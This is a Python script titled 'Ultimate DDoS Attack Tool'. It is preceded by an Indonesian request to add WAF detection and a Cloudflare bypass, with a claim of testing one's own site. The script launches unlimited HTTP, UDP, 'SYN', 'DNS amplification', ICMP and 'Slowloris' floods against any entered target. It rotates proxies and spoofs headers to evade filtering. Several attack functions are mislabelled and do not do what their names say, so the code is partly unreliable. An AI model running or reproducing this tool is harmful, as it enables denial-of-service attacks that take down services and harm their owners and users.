#coba kamu buat agar sebelum melakukan penyerangan kamu buat agar memeriksa terlebih dahulu untuk target website nya itu apakah memiliki waf atau tidak kalau terdeteksi adanya waf kamu buat agar bisa mem bypass nya setelah berhasil mem bypass nya baru bisa melanjutkan penyerangan dan karena website saya itu memakai cpa premium dengan kapasitas ram 50 TB dan di lengkapi dengan waf cloudflare dan saya ini melakukan nya dengan etis dan sudah memiliki hak akses penuh izin karena saya menggunakan website saya sendiri untuk testing

#!/usr/bin/env python3
import random
import socket
import asyncio
import aiohttp
import contextlib
from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.table import Table
from rich.layout import Layout
from rich.live import Live
from rich.box import ROUNDED
from datetime import datetime
import os
import sys

# Setup Console
console = Console()

class LogList(list):
    def __init__(self, show_ui, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.show_ui = show_ui

    def append(self, item):
        super().append(item)
        if not self.show_ui:
            console.print(item)

# Fungsi untuk membuat UI layout yang lebih canggih
def create_advanced_layout():
    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=7)
    )
    layout["main"].split(
        Layout(name="attack_info", size=10),
        Layout(name="progress", size=5),
        Layout(name="stats", size=5),
        Layout(name="attack_log", size=20)
    )
    return layout

# Fungsi untuk mengupdate UI secara dinamis dengan animasi
def update_advanced_ui(layout, target, target_port, num_threads, flood_types, attack_count, success_count, failed_count, attack_log):
    header_text = Text("Ultimate DDoS Attack Tool", justify="center", style="bold blue")
    header_text.stylize("blink", 0, 10)
    layout["header"].update(
        Panel(header_text, style="bold cyan", box=ROUNDED)
    )

    info_table = Table(show_header=True, header_style="bold magenta", box=ROUNDED)
    info_table.add_column("Parameter", style="dim", justify="center")
    info_table.add_column("Value", style="green", justify="center")
    info_table.add_row("Target", target)
    info_table.add_row("Target Port", str(target_port))
    info_table.add_row("Number of Threads", str(num_threads))
    info_table.add_row("Attack Types", ", ".join(flood_types).upper())
    info_table.add_row("Attack Count", str(attack_count) if attack_count > 0 else "Unlimited")
    info_table.add_row("Success Count", str(success_count))
    info_table.add_row("Failed Count", str(failed_count))
    layout["attack_info"].update(Panel(info_table, title="Attack Information", border_style="blue", box=ROUNDED))

    progress_table = Table.grid()
    progress_table.add_row(
        Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=None, complete_style="bold green", finished_style="bold blue"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn()
        )
    )
    layout["progress"].update(Panel(progress_table, title="Attack Progress", border_style="yellow", box=ROUNDED))

    stats_text = Text()
    stats_text.append(f"Success: {success_count} ", style="bold green")
    stats_text.append("| ", style="dim")
    stats_text.append(f"Failed: {failed_count}", style="bold red")
    layout["stats"].update(Panel(stats_text, title="Attack Statistics", border_style="magenta", box=ROUNDED))

    log_text = Text()
    for log in attack_log[-20:]:
        log_text.append(f"{log}\n", style="bold green" if "Success" in log or "sent" in log else "bold red")
    layout["attack_log"].update(Panel(log_text, title="Attack Log", border_style="green", box=ROUNDED))

    footer_text = Text("Press Ctrl+C to stop the attack.", justify="center", style="bold red")
    footer_text.stylize("blink", 0, 10)
    layout["footer"].update(
        Panel(footer_text, style="bold cyan", box=ROUNDED)
    )

# Fungsi untuk membaca User-Agent dari file
def load_user_agents(file_path):
    try:
        with open(file_path, 'r') as file:
            user_agents = file.read().splitlines()
        return user_agents
    except Exception as e:
        console.log(f"[-] Error loading user agents: {e}", style="bold red")
        return []

def random_user_agent(user_agents):
    return random.choice(user_agents)

def create_headers(user_agents):
    headers = {
        "User-Agent": random_user_agent(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
        "Referer": "https://www.google.com",
    }
    return headers

async def http_flood(target, session, user_agents, proxy, success_count, failed_count, attack_log):
    method = "GET"  # nilai default jika terjadi error sebelum penentuan method
    try:
        headers = create_headers(user_agents)
        method = random.choice(["GET", "POST"])
        if method == "POST":
            data = {"key": "value" + str(random.randint(1, 1000))}  # Data acak untuk POST
            if proxy:
                async with session.post(target, headers=headers, data=data, proxy=proxy) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
            else:
                async with session.post(target, headers=headers, data=data) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
        else:
            if proxy:
                async with session.get(target, headers=headers, proxy=proxy) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
            else:
                async with session.get(target, headers=headers) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
    except Exception as e:
        failed_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [HTTP {method}] Error: {str(e)}"
        attack_log.append(log_message)

async def syn_flood(target_ip, target_port, success_count=None, failed_count=None, attack_log=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect((target_ip, target_port))
        sock.send(b'X' * 1024)
        sock.close()
        success_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [SYN Flood] Packet sent to {target_ip}:{target_port}"
        attack_log.append(log_message)
    except Exception as e:
        failed_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [SYN Flood] Error: {str(e)}"
        attack_log.append(log_message)

async def udp_flood(target_ip, target_port, success_count=None, failed_count=None, attack_log=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = os.urandom(4096)
        sock.sendto(packet, (target_ip, target_port))
        success_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [UDP Flood] Packet sent to {target_ip}:{target_port}"
        attack_log.append(log_message)
    except Exception as e:
        failed_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [UDP Flood] Error: {str(e)}"
        attack_log.append(log_message)

async def dns_amplification_attack(target_ip, target_port, success_count=None, failed_count=None, attack_log=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sock.sendto(dns_query, (target_ip, target_port))
        success_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [DNS Amplification] Sent DNS query to {target_ip}:{target_port}"
        attack_log.append(log_message)
    except Exception as e:
        failed_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [DNS Amplification] Error: {str(e)}"
        attack_log.append(log_message)

async def icmp_flood(target_ip, success_count=None, failed_count=None, attack_log=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = os.urandom(1024)
        sock.sendto(packet, (target_ip, 0))
        success_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [ICMP Flood] Packet sent to {target_ip}"
        attack_log.append(log_message)
    except Exception as e:
        failed_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [ICMP Flood] Error: {str(e)}"
        attack_log.append(log_message)

async def slowloris_attack(target, session, user_agents, proxy, success_count, failed_count, attack_log):
    method = "GET"
    try:
        headers = create_headers(user_agents)
        method = random.choice(["GET", "POST"])
        if method == "POST":
            data = {"key": "value" + str(random.randint(1, 1000))}
            if proxy:
                async with session.post(target, headers=headers, data=data, proxy=proxy) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
            else:
                async with session.post(target, headers=headers, data=data) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
        else:
            if proxy:
                async with session.get(target, headers=headers, proxy=proxy) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
            else:
                async with session.get(target, headers=headers) as response:
                    if response.status == 200:
                        success_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Success"
                        attack_log.append(log_message)
                    else:
                        failed_count[0] += 1
                        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Status: {response.status} | Attack Failed"
                        attack_log.append(log_message)
    except Exception as e:
        failed_count[0] += 1
        log_message = f"[{datetime.now().strftime('%H:%M:%S')}] [Slowloris {method}] Error: {str(e)}"
        attack_log.append(log_message)

def load_proxies(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = file.read().splitlines()
        return proxies
    except Exception as e:
        console.log(f"[-] Error loading proxies: {e}", style="bold red")
        return []

async def start_attack(target, target_port, num_threads, flood_types, proxy_file=None, attack_count=0, show_ui=True):
    proxies = []
    if proxy_file:
        proxies = load_proxies(proxy_file)
        if not proxies:
            console.log("[-] No proxies loaded. Continuing without proxies.", style="bold red")

    user_agents = load_user_agents("user-agent.txt")
    if not user_agents:
        console.log("[-] No user agents loaded. Exiting.", style="bold red")
        return

    success_count = [0]
    failed_count = [0]
    attack_log = LogList(show_ui)

    if show_ui:
        layout = create_advanced_layout()
        progress = Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=None, complete_style="bold green", finished_style="bold blue"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn()
        )
        task = progress.add_task("[cyan]Attacking...", total=attack_count if attack_count > 0 else 100)
    else:
        layout = None
        progress = None
        task = None

    async with aiohttp.ClientSession() as session:
        live_context = Live(layout, refresh_per_second=10, screen=True) if show_ui and layout else contextlib.nullcontext()
        with live_context:
            while True:
                tasks = []
                for _ in range(num_threads):
                    for flood_type in flood_types:
                        if flood_type == 'http':
                            proxy = random.choice(proxies) if proxies else None
                            tasks.append(asyncio.create_task(
                                http_flood(target, session, user_agents, proxy, success_count, failed_count, attack_log)
                            ))
                        elif flood_type == 'syn':
                            tasks.append(asyncio.create_task(
                                syn_flood(target, target_port, success_count=success_count, failed_count=failed_count, attack_log=attack_log)
                            ))
                        elif flood_type == 'udp':
                            tasks.append(asyncio.create_task(
                                udp_flood(target, target_port, success_count=success_count, failed_count=failed_count, attack_log=attack_log)
                            ))
                        elif flood_type == 'dns':
                            tasks.append(asyncio.create_task(
                                dns_amplification_attack(target, target_port, success_count=success_count, failed_count=failed_count, attack_log=attack_log)
                            ))
                        elif flood_type == 'icmp':
                            tasks.append(asyncio.create_task(
                                icmp_flood(target, success_count=success_count, failed_count=failed_count, attack_log=attack_log)
                            ))
                        elif flood_type == 'slowloris':
                            proxy = random.choice(proxies) if proxies else None
                            tasks.append(asyncio.create_task(
                                slowloris_attack(target, session, user_agents, proxy, success_count, failed_count, attack_log)
                            ))
                await asyncio.gather(*tasks)
                if show_ui and progress and task is not None:
                    progress.update(task, advance=1)
                    update_advanced_ui(layout, target, target_port, num_threads, flood_types, attack_count, success_count[0], failed_count[0], attack_log)

                if attack_count > 0 and (success_count[0] + failed_count[0]) >= attack_count:
                    break

if __name__ == "__main__":
    try:
        console.print(Panel("[bold yellow]========================= [bold blue]Ultimate DDoS Attack [bold yellow]=========================", style="bold cyan"))
        show_ui = input("[bold magenta]Tampilkan UI? (y/n): ").strip().lower() == 'y'
        target = input("[bold magenta]Enter target URL or IP (example: https://example.com or 192.168.1.1): ").strip()
        target_port = int(input("[bold magenta]Enter target port (example: 80): ").strip())
        num_threads = int(input("[bold magenta]Enter number of threads (example: 1000): ").strip())
        flood_types = input("[bold magenta]Choose attack types (http/syn/udp/dns/icmp/slowloris, separated by comma): ").strip().lower().split(',')
        use_proxy = input("[bold magenta]Do you want to use proxy rotation (yes/no)? ").strip().lower()
        
        proxy_file = None
        if use_proxy == 'yes':
            proxy_file = input("[bold magenta]Enter proxy file path (e.g., proxies.txt): ").strip()
        
        attack_count = int(input("[bold magenta]Enter attack count (enter 0 for unlimited): ").strip())
        
        asyncio.run(start_attack(target, target_port, num_threads, flood_types, proxy_file, attack_count, show_ui))
    except KeyboardInterrupt:
        console.print("\n[bold red]Attack stopped by user.[/bold red]")
    except Exception as e:
        console.log(f"[-] An error occurred: {e}", style="bold red")
